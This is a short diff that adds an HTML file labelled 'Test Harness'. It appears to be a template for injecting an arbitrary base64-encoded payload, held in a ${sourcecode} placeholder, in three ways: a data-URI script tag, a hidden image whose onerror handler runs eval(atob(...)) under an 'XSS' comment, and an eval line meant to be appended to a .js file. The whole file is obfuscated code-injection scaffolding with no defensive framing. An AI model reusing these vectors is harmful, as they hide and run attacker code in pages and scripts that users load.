@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Test Harness</title>
+    <!-- Include Script in HTML Template -->
+    <script src="data:text/javascript;base64,${sourcecode}"></script>
+</head>
+<body>
+    <!-- Cross-Site Scripting (XSS) -->
+    <img src="x" style="display:none" onerror="eval(atob(/${sourcecode}/.source))"/>
+</body>
+<script>
+    // Insert Line at End of .js File:
+    eval(atob(/${sourcecode}/.source))
+</script>
+</html>
